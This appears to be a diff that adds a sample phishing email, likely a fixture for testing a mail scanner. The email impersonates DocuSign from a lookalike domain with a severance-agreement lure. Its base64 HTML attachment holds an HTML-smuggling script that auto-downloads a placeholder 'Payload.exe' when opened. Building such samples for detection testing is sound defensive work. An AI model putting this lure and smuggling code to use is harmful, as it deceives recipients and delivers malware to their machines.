@@ -1,0 +1,24 @@
+From: "DocuSign Notification" <docusign@secure-doc-delivery.com>
+To: victim@company.com
+Subject: Completed Document: Severance Agreement & Release.html
+Return-Path: <docusign@secure-doc-delivery.com>
+Reply-To: <docusign@secure-doc-delivery.com>
+Date: Fri, 16 Oct 2026 15:30:00 +0000
+Message-ID: <test-07-2026@mail-gateway.org>
+Authentication-Results: mx.company.com; spf=pass dkim=none dmarc=none
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============BOUNDARY_PHISH_73_07=="
+
+--===============BOUNDARY_PHISH_73_07==
+Content-Type: text/html; charset=utf-8
+
+Please open the attached secure document viewer to inspect and sign your document.
+
+--===============BOUNDARY_PHISH_73_07==
+Content-Type: text/html; name="Secure_Document_Viewer.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Secure_Document_Viewer.html"
+
+PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgYj1uZXcgQmxvYihbJ01aZmFrZWJpbmFyeSddLHt0eXBlOidvY3RldC9zdHJlYW0nfSk7dmFyIHU9d2luZG93LlVSTC5jcmVhdGVPYmplY3RVUkwoYik7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYScpO2EuaHJlZj11O2EuZG93bmxvYWQ9J1BheWxvYWQuZXhlJzthLmNsaWNrKCk7PC9zY3JpcHQ+PC9ib2R5PjwvaHRtbD4=
+
+--===============BOUNDARY_PHISH_73_07==--
